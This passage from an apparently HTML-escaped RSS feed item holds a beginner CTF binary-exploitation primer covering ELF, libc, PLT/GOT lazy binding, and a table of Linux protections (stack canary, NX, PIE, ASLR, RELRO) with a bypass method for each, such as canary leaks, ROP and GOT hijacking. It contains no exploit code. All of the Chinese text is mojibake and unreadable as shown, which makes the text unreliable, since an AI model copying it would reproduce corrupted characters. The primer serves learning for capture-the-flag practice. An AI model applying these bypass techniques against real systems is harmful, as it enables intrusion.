&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;elf&lt;/strong&gt;æ˜¯ Linux ç¯å¢ƒä¸‹äºŒè¿›åˆ¶å¯æ‰§è¡Œæ–‡ä»¶çš„æ ‡å‡†æ ¼å¼ï¼Œå­˜å‚¨åœ¨ç£ç›˜ä¸Šï¼Œè¿è¡Œæ—¶åŠ è½½åˆ°å†…å­˜åŒ…å«å¤šä¸ªèŠ‚ï¼ˆå¦‚.text ä»£ç èŠ‚ã€.data æ•°æ®èŠ‚ã€.plt/.got åŠ¨æ€é“¾æ¥ç›¸å…³èŠ‚ç­‰ï¼‰ï¼ŒèŠ‚åœ¨åŠ è½½æ—¶æŒ‰æƒé™åˆå¹¶æ˜ å°„åˆ°å†…å­˜ä¸­çš„æ®µæœ‰ä¸¤ç§çŠ¶æ€ï¼šæœªè¿è¡Œæ—¶ä½œä¸ºé™æ€è½½ä½“å­˜äºç£ç›˜ï¼Œè¿è¡Œæ—¶åŠ è½½åˆ°å†…å­˜ä¾›CPU æ‰§è¡Œã€‚&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;libc&lt;/strong&gt;æ˜¯ Linux ä¸‹çš„ C æ ‡å‡†åº“ï¼ˆæœ€å¸¸ç”¨çš„æ˜¯ glibcï¼‰ï¼Œä»¥.so æ–‡ä»¶ï¼ˆæœ¬è´¨ä¹Ÿæ˜¯ ELFï¼‰å½¢å¼å­˜åœ¨ï¼ˆå¦‚ /lib/libc.so.6ï¼‰
åŒ…å«å¤§é‡åŸºç¡€å‡½æ•°ï¼Œæ˜¯ç»å¤§å¤šæ•°ç¨‹åºçš„ä¾èµ–ï¼Œåœ¨ CTF Pwn ä¸­å…·æœ‰é‡è¦åœ°ä½ã€‚&lt;/p&gt;
&lt;p&gt;ä¸¤è€…å…³ç³»ï¼šç¨‹åºï¼ˆELFï¼‰è¿è¡Œæ—¶ä¼šåŠ¨æ€é“¾æ¥ libc ä¸­çš„å‡½æ•°ï¼Œé€šè¿‡PLT/GOT ç­‰æœºåˆ¶å®ç°è°ƒç”¨ã€‚&lt;/p&gt;
&lt;h3 id=&#34;å»¶è¿Ÿç»‘å®šæœºåˆ¶-1&#34;&gt;å»¶è¿Ÿç»‘å®šæœºåˆ¶
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;åŠ¨æ€é“¾æ¥åº“ä¸ç¼–è¯‘æ–¹å¼&lt;/strong&gt;ï¼š&lt;/p&gt;
&lt;p&gt;åŠ¨æ€é“¾æ¥åº“ï¼ˆå¦‚ libc.soï¼‰å­˜ç³»ç»Ÿå‡½æ•°ï¼ˆreadã€printf ç­‰ï¼‰ï¼Œç¨‹åºæ— éœ€è‡ªå·±å®ç°ï¼ŒåŠ¨æ€è°ƒç”¨å³å¯ï¼›&lt;/p&gt;
&lt;p&gt;é™æ€ç¼–è¯‘ï¼šæŠŠæ‰€æœ‰å¯èƒ½ç”¨åˆ°çš„åº“å‡½æ•°æ‰“åŒ…è¿›å¯æ‰§è¡Œæ–‡ä»¶ï¼Œä¸ä¾èµ–å¤–éƒ¨åº“ä½†ä½“ç§¯å¤§ï¼›&lt;/p&gt;
&lt;p&gt;åŠ¨æ€ç¼–è¯‘ï¼šä»…åœ¨è°ƒç”¨æ—¶ä»åº“ä¸­å–å‡½æ•°ï¼Œä½“ç§¯å°ä½†ä¾èµ–å¤–éƒ¨åº“ã€‚&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;PLT ä¸ GOT çš„ä½œç”¨å’Œå»¶è¿Ÿç»‘å®š&lt;/strong&gt;ï¼š
ä¸ºè§£å†³åŠ¨æ€ç¼–è¯‘ä¸­ â€œæ‰¾å‡½æ•°åœ°å€â€ çš„æ•ˆç‡é—®é¢˜ï¼Œç”¨ GOTï¼ˆå…¨å±€åç§»è¡¨ï¼Œåƒ â€œå°æœ¬æœ¬â€ï¼‰å­˜å‡½æ•°åœ°å€ï¼ŒPLTï¼ˆç¨‹åºé“¾æ¥è¡¨ï¼Œåƒ â€œè·³æ¿â€ï¼‰è´Ÿè´£è°ƒç”¨é€»è¾‘ï¼›
å»¶è¿Ÿç»‘å®šï¼šç¨‹åºå¯åŠ¨æ—¶ä¸è§£ææ‰€æœ‰å‡½æ•°åœ°å€ï¼Œç¬¬ä¸€æ¬¡è°ƒç”¨æ—¶æ‰é€šè¿‡ PLT è§¦å‘åŠ¨æ€é“¾æ¥å™¨ï¼ˆç”¨_dl_runtime_resolve å‡½æ•°ï¼‰è§£æçœŸå®åœ°å€ï¼Œå¹¶å­˜å…¥ GOTï¼Œåç»­è°ƒç”¨ç›´æ¥è¯» GOT å³å¯ã€‚&lt;/p&gt;
&lt;p&gt;ç¬¬ä¸€æ¬¡è°ƒç”¨å¤–éƒ¨å‡½æ•°çš„æµç¨‹ï¼š
è°ƒç”¨å‡½æ•°â†’è·³ PLT å¯¹åº”æ¡ç›®â†’GOT æœªå­˜çœŸå®åœ°å€ï¼Œè·³å› PLT å‡†å¤‡å‚æ•°â†’è·³ PLT è¡¨å¤´è§¦å‘è§£æâ†’åŠ¨æ€é“¾æ¥å™¨è§£æåœ°å€å†™å…¥ GOTâ†’åç»­è°ƒç”¨ç›´æ¥ç”¨ GOT åœ°å€ã€‚&lt;/p&gt;
&lt;h3 id=&#34;linuxå®‰å…¨é˜²æŠ¤æœºåˆ¶-1&#34;&gt;Linuxå®‰å…¨é˜²æŠ¤æœºåˆ¶
&lt;/h3&gt;&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;ä¿æŠ¤æœºåˆ¶&lt;/th&gt;
          &lt;th&gt;æ ¸å¿ƒä½œç”¨&lt;/th&gt;
          &lt;th&gt;å…³é”®ç‰¹ç‚¹&lt;/th&gt;
          &lt;th&gt;ç»•è¿‡æ–¹å¼&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;CANARY&lt;/td&gt;
          &lt;td&gt;æ£€æµ‹æ ˆæº¢å‡º&lt;/td&gt;
          &lt;td&gt;æ ˆåº•å­˜ 8 å­—èŠ‚ï¼ˆx64ï¼‰éšæœºæ•°ï¼ˆé¦–å­—èŠ‚ \x00ï¼‰ï¼Œè¿”å›å‰æ¯”å¯¹&lt;/td&gt;
          &lt;td&gt;å…ˆæ³„æ¼æ ˆä¸Š canaryï¼Œå†ç”¨æ³„æ¼å€¼è¦†ç›–æ ˆä¸Š canary&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;NX&lt;/td&gt;
          &lt;td&gt;é˜² shellcode æ‰§è¡Œ&lt;/td&gt;
          &lt;td&gt;æ ˆã€å †ç­‰å¯å†™åŒºåŸŸæ ‡è®°ä¸º â€œä¸å¯æ‰§è¡Œâ€&lt;/td&gt;
          &lt;td&gt;ç”¨ mprotect æ”¹æƒé™ï¼Œæˆ–ç”¨ ROPã€GOT åŠ«æŒ&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;PIE&lt;/td&gt;
          &lt;td&gt;ç¨‹åºè‡ªèº«åŠ è½½åœ°å€éšæœº&lt;/td&gt;
          &lt;td&gt;ç¼–è¯‘é€‰é¡¹å†³å®šï¼Œæ¯æ¬¡è¿è¡ŒåŠ è½½åœ°å€ä¸åŒ&lt;/td&gt;
          &lt;td&gt;æ³„æ¼ç¨‹åºå†…å‡½æ•°åœ°å€ï¼Œç®—åŸºåœ°å€&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;ASLR&lt;/td&gt;
          &lt;td&gt;ç³»ç»Ÿå†…å­˜å¸ƒå±€éšæœº&lt;/td&gt;
          &lt;td&gt;ç³»ç»Ÿæœºåˆ¶ï¼Œéšæœºåº“ã€æ ˆã€å †åœ°å€&lt;/td&gt;
          &lt;td&gt;æ³„æ¼åº“å‡½æ•°åœ°å€ï¼Œç®—ç›®æ ‡å‡½æ•°åœ°å€&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;RELRO&lt;/td&gt;
          &lt;td&gt;é˜² GOT/PLT åŠ«æŒ&lt;/td&gt;
          &lt;td&gt;åˆ† Partialï¼ˆ.got.plt åªè¯»ï¼‰ã€Fullï¼ˆå…¨ GOT åªè¯»ï¼‰&lt;/td&gt;
          &lt;td&gt;Partial å¯æ”»æœªä¿æŠ¤ GOT æ®µï¼›Full å¼ƒ GOT æ”»å…¶ä»–&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;ç»“å°¾&#34;&gt;ç»“å°¾
&lt;/h2&gt;&lt;p&gt;åŸºæœ¬çš„PWNç†è®ºçŸ¥è¯†å°±åˆ°è¿™é‡Œäº†ï¼Œç°åœ¨ä½ çœ‹åˆ«äººPWNç¥çš„writeupåº”è¯¥ä¸ä¼šè¿™ä¹ˆâ€œç‰¢â€äº†å§ï¼ŒåŸºæœ¬èƒ½çœ‹æ‡‚åˆ«äººè¯´çš„ä¸“ç”¨è¯äº†ã€‚&lt;/p&gt;
</description>
        </item>
        
    </channel>
</rss>
